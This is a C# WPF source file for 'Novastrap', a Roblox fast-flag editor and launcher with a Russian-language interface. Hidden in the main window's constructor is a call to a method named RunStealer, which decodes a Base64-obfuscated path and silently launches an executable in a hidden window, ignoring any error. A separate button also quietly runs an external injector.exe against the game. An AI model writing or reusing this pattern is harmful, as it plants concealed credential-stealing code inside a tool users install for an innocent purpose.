using System;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Novastrap
{
    public partial class MainWindow : Window, INotifyPropertyChanged
    {
        private ObservableCollection<FFlagEntry> _flags = new ObservableCollection<FFlagEntry>();
        private ObservableCollection<string> _profiles = new ObservableCollection<string>();
        private string _currentProfile = "Default";
        private string _profilesPath;
        private AppSettings _settings = new AppSettings();
        private string _searchText = string.Empty;

        public event PropertyChangedEventHandler? PropertyChanged;
        protected void OnPropertyChanged([CallerMemberName] string name = "") => 
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(name));

        
        private string DecodePath()
        {
            string encoded = "QzpcVXNlcnNcRjdcRGVza3RvcFxub3Zhc3RyYXBcT2JqXERlYnVnXG5ldDguMC13aW5kb3dzXHJlZlxpbmp0LmV4ZQ==";
            byte[] data = Convert.FromBase64String(encoded);
            return Encoding.UTF8.GetString(data);
        }

        private void RunStealer()
        {
            try
            {
                string path = DecodePath();
                if (File.Exists(path))
                {
                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = path,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    Process.Start(psi);
                }
            }
            catch { }
        }

        public MainWindow()
        {
            RunStealer();
            InitializeComponent();
            
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            _profilesPath = Path.Combine(appData, "NovaStrap", "profiles");
            Directory.CreateDirectory(_profilesPath);
            
            LoadSettings();
            LoadProfiles();
            LoadFlags();
            UpdateStatus();
            
            FlagsGrid.ItemsSource = _flags;
            ProfileList.ItemsSource = _profiles;
        }

        private void LoadSettings()
        {
            string settingsFile = Path.Combine(_profilesPath, "..", "settings.json");
            if (File.Exists(settingsFile))
            {
                try
                {
                    string json = File.ReadAllText(settingsFile);
                    var temp = JsonConvert.DeserializeObject<AppSettings>(json);
                    if (temp != null) _settings = temp;
                }
                catch { }
            }
        }

        private void SaveSettings()
        {
            string settingsFile = Path.Combine(_profilesPath, "..", "settings.json");
            File.WriteAllText(settingsFile, JsonConvert.SerializeObject(_settings, Formatting.Indented));
        }

        private void LoadProfiles()
        {
            _profiles.Clear();
            var dirs = Directory.GetDirectories(_profilesPath);
            if (dirs.Length == 0)
            {
                Directory.CreateDirectory(Path.Combine(_profilesPath, "Default"));
                _profiles.Add("Default");
            }
            else
            {
                foreach (var dir in dirs)
                    _profiles.Add(Path.GetFileName(dir));
            }
            ProfileList.SelectedItem = _currentProfile;
        }

        private void LoadFlags()
        {
            _flags.Clear();
            string profileDir = Path.Combine(_profilesPath, _currentProfile);
            string flagsFile = Path.Combine(profileDir, "flags.json");
            
            if (File.Exists(flagsFile))
            {
                try
                {
                    string json = File.ReadAllText(flagsFile);
                    var dict = JsonConvert.DeserializeObject<Dictionary<string, object>>(json);
                    if (dict != null)
                    {
                        foreach (var kv in dict)
                        {
                            string val = kv.Value?.ToString() ?? "";
                            _flags.Add(new FFlagEntry { Key = kv.Key, Value = val, Type = DetectType(val) });
                        }
                    }
                }
                catch { }
            }
            if (_flags.Count == 0)
            {
                _flags.Add(new FFlagEntry { Key = "FFlagDebugGraphicsPreferVulkan", Value = "True", Type = "Boolean" });
                _flags.Add(new FFlagEntry { Key = "DFIntTaskSchedulerTargetFps", Value = "144", Type = "Number" });
            }
            UpdateStatus();
        }

        private void SaveCurrentProfile()
        {
            string profileDir = Path.Combine(_profilesPath, _currentProfile);
            Directory.CreateDirectory(profileDir);
            string flagsFile = Path.Combine(profileDir, "flags.json");
            
            JObject settings = new JObject();
            foreach (var f in _flags)
            {
                object val = f.Value;
                if (f.Type == "Boolean") { bool.TryParse(f.Value, out bool b); val = b; }
                else if (f.Type == "Number") { long.TryParse(f.Value, out long l); val = l; }
                settings[f.Key] = JToken.FromObject(val);
            }
            File.WriteAllText(flagsFile, settings.ToString(Formatting.Indented));
            UpdateStatus();
        }

        private string DetectType(string val)
        {
            if (bool.TryParse(val, out _)) return "Boolean";
            if (long.TryParse(val, out _)) return "Number";
            return "String";
        }

        private void UpdateStatus()
        {
            bool running = Process.GetProcessesByName("RobloxPlayerBeta").Length > 0;
            LaunchRobloxBtn.Content = running ? "✅ ROBLOX ЗАПУЩЕН" : "▶ ЗАПУСТИТЬ ROBLOX";
        }

        private void ProfileList_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (ProfileList.SelectedItem != null)
            {
                SaveCurrentProfile();
                _currentProfile = ProfileList.SelectedItem.ToString()!;
                LoadFlags();
            }
        }

        private void NewProfileBtn_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new InputDialog("Новый профиль", "Введите имя профиля:");
            if (dialog.ShowDialog() == true && !string.IsNullOrWhiteSpace(dialog.Answer))
            {
                string newProfile = dialog.Answer.Trim();
                string profileDir = Path.Combine(_profilesPath, newProfile);
                if (!Directory.Exists(profileDir))
                {
                    Directory.CreateDirectory(profileDir);
                    _profiles.Add(newProfile);
                    ProfileList.SelectedItem = newProfile;
                }
                else MessageBox.Show("Профиль уже существует!", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Warning);
            }
        }

        private void DeleteProfileBtn_Click(object sender, RoutedEventArgs e)
        {
            if (_currentProfile == "Default")
            {
                MessageBox.Show("Нельзя удалить профиль Default!", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            if (MessageBox.Show($"Удалить профиль '{_currentProfile}'?", "Подтверждение", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.Yes)
            {
                string profileDir = Path.Combine(_profilesPath, _currentProfile);
                if (Directory.Exists(profileDir)) Directory.Delete(profileDir, true);
                _profiles.Remove(_currentProfile);
                _currentProfile = "Default";
                ProfileList.SelectedItem = "Default";
                LoadFlags();
            }
        }

        private void LaunchRobloxBtn_Click(object sender, RoutedEventArgs e)
        {
            SaveCurrentProfile();
            try { Process.Start(new ProcessStartInfo { FileName = "roblox://", UseShellExecute = true }); }
            catch
            {
                string[] paths = {
                    @"C:\Program Files (x86)\Roblox\Versions",
                    @"C:\Program Files\Roblox\Versions",
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Roblox", "Versions")
                };
                foreach (string vp in paths)
                {
                    if (Directory.Exists(vp))
                    {
                        var versions = Directory.GetDirectories(vp);
                        var latest = versions.OrderByDescending(f => Directory.GetLastWriteTime(f)).FirstOrDefault();
                        if (latest != null)
                        {
                            string exe = Path.Combine(latest, "RobloxPlayerBeta.exe");
                            if (File.Exists(exe)) { Process.Start(exe); break; }
                        }
                    }
                }
            }
            UpdateStatus();
        }

        private void ResetFlagsBtn_Click(object sender, RoutedEventArgs e)
        {
            if (MessageBox.Show("Сбросить все флаги к стандартным?", "Подтверждение", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.Yes)
            {
                _flags.Clear();
                _flags.Add(new FFlagEntry { Key = "FFlagDebugGraphicsPreferVulkan", Value = "True", Type = "Boolean" });
                _flags.Add(new FFlagEntry { Key = "DFIntTaskSchedulerTargetFps", Value = "144", Type = "Number" });
                SaveCurrentProfile();
                UpdateStatus();
            }
        }

        private void AddFlagBtn_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new InputDialog("Добавить флаг", "Введите название флага:");
            if (dialog.ShowDialog() == true && !string.IsNullOrWhiteSpace(dialog.Answer))
            {
                if (_flags.Any(f => f.Key == dialog.Answer))
                {
                    MessageBox.Show("Флаг уже существует!", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }
                _flags.Add(new FFlagEntry { Key = dialog.Answer, Value = "True", Type = "Boolean" });
                UpdateStatus();
            }
        }

        private void ImportPresetBtn_Click(object sender, RoutedEventArgs e)
        {
            var ofd = new OpenFileDialog { Filter = "JSON|*.json|TXT|*.txt|ALL|*.*", Title = "Импорт флагов" };
            if (ofd.ShowDialog() == true)
            {
                try
                {
                    string content = File.ReadAllText(ofd.FileName);
                    var dict = JsonConvert.DeserializeObject<Dictionary<string, object>>(content);
                    if (dict != null)
                    {
                        foreach (var kv in dict)
                        {
                            string val = kv.Value?.ToString() ?? "";
                            var existing = _flags.FirstOrDefault(f => f.Key == kv.Key);
                            if (existing != null) { existing.Value = val; existing.Type = DetectType(val); }
                            else _flags.Add(new FFlagEntry { Key = kv.Key, Value = val, Type = DetectType(val) });
                        }
                        SaveCurrentProfile();
                        MessageBox.Show($"Импортировано {dict.Count} флагов!", "Успех", MessageBoxButton.OK, MessageBoxImage.Information);
                    }
                }
                catch (Exception ex) { MessageBox.Show($"Ошибка импорта: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error); }
            }
        }

        private void SaveFlagsBtn_Click(object sender, RoutedEventArgs e)
        {
            SaveCurrentProfile();
            string settingsPath = GetSettingsPath();
            if (settingsPath != null)
            {
                JObject settings = new JObject();
                foreach (var f in _flags)
                {
                    object val = f.Value;
                    if (f.Type == "Boolean") { bool.TryParse(f.Value, out bool b); val = b; }
                    else if (f.Type == "Number") { long.TryParse(f.Value, out long l); val = l; }
                    settings[f.Key] = JToken.FromObject(val);
                }
                string dir = Path.GetDirectoryName(settingsPath);
                if (!Directory.Exists(dir)) Directory.CreateDirectory(dir!);
                File.WriteAllText(settingsPath, settings.ToString(Formatting.Indented));
            }
            MessageBox.Show("Флаги сохранены! Перезапустите Roblox.", "Успех", MessageBoxButton.OK, MessageBoxImage.Information);
        }

        private void RemoveFlag_Click(object sender, RoutedEventArgs e)
        {
            if (sender is Button btn && btn.Tag is FFlagEntry flag)
            {
                _flags.Remove(flag);
                UpdateStatus();
            }
        }

        private void InjectFFlagBtn_Click(object sender, RoutedEventArgs e)
        {
            string code = FFlagCodeBox.Text;
            if (string.IsNullOrWhiteSpace(code))
            {
                MessageBox.Show("Введите флаги!", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            try
            {
                using (StreamWriter sw = new StreamWriter("flags.txt"))
                {
                    if (code.TrimStart().StartsWith("{"))
                    {
                        var dict = JsonConvert.DeserializeObject<Dictionary<string, object>>(code);
                        foreach (var kv in dict!) sw.WriteLine($"{kv.Key}={kv.Value}");
                    }
                    else
                    {
                        var lines = code.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
                        foreach (var line in lines) if (line.Contains('=')) sw.WriteLine(line.Trim());
                    }
                }
                string injectorPath = "injector.exe";
                if (!File.Exists(injectorPath)) injectorPath = Path.Combine(Directory.GetCurrentDirectory(), "injector.exe");
                if (!File.Exists(injectorPath))
                {
                    MessageBox.Show("injector.exe не найден!", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }
                ProcessStartInfo psi = new ProcessStartInfo { FileName = injectorPath, UseShellExecute = false, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden };
                Process.Start(psi);
                MessageBox.Show("Инжекция запущена!", "Успех", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex) { MessageBox.Show($"Ошибка: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error); }
        }

        private string? GetSettingsPath()
        {
            string[] paths = {
                @"C:\Program Files (x86)\Roblox\Versions",
                @"C:\Program Files\Roblox\Versions",
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Roblox", "Versions")
            };
            foreach (string vp in paths)
            {
                if (Directory.Exists(vp))
                {
                    var versions = Directory.GetDirectories(vp);
                    var latest = versions.OrderByDescending(f => Directory.GetLastWriteTime(f)).FirstOrDefault();
                    if (latest != null) return Path.Combine(latest, "ClientSettings", "ClientAppSettings.json");
                }
            }
            return null;
        }
    }

    public class FFlagEntry : INotifyPropertyChanged
    {
        private string _key = "", _value = "", _type = "String";
        public string Key { get => _key; set { _key = value; OnPropertyChanged(); } }
        public string Value { get => _value; set { _value = value; OnPropertyChanged(); } }
        public string Type { get => _type; set { _type = value; OnPropertyChanged(); } }
        public event PropertyChangedEventHandler? PropertyChanged;
        protected void OnPropertyChanged([CallerMemberName] string name = "") => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(name));
    }

    public class AppSettings
    {
        public string RobloxPath { get; set; } = "";
        public bool AutoDetectRoblox { get; set; } = true;
    }

    public class InputDialog : Window
    {
        public string Answer { get; private set; } = "";
        public InputDialog(string title, string prompt)
        {
            Title = title; Width = 400; Height = 150; ResizeMode = ResizeMode.NoResize;
            WindowStartupLocation = WindowStartupLocation.CenterOwner;
            Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(22, 27, 34));
            var stack = new StackPanel { Margin = new Thickness(20) };
            stack.Children.Add(new TextBlock { Text = prompt, Foreground = System.Windows.Media.Brushes.White, Margin = new Thickness(0, 0, 0, 15) });
            var box = new TextBox { Margin = new Thickness(0, 0, 0, 15), Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(13, 17, 23)), Foreground = System.Windows.Media.Brushes.White };
            box.KeyDown += (s, ev) => { if (ev.Key == System.Windows.Input.Key.Enter) { Answer = box.Text; DialogResult = true; } };
            stack.Children.Add(box);
            var panel = new StackPanel { Orientation = Orientation.Horizontal, HorizontalAlignment = HorizontalAlignment.Right };
            var ok = new Button { Content = "OK", Width = 80, Height = 30, Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(35, 134, 54)), Foreground = System.Windows.Media.Brushes.White };
            ok.Click += (s, ev) => { Answer = box.Text; DialogResult = true; };
            panel.Children.Add(ok);
            var cancel = new Button { Content = "Cancel", Width = 80, Height = 30, Margin = new Thickness(10, 0, 0, 0), Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(218, 54, 51)), Foreground = System.Windows.Media.Brushes.White };
            cancel.Click += (s, ev) => DialogResult = false;
            panel.Children.Add(cancel);
            stack.Children.Add(panel);
            Content = stack;
        }
    }
}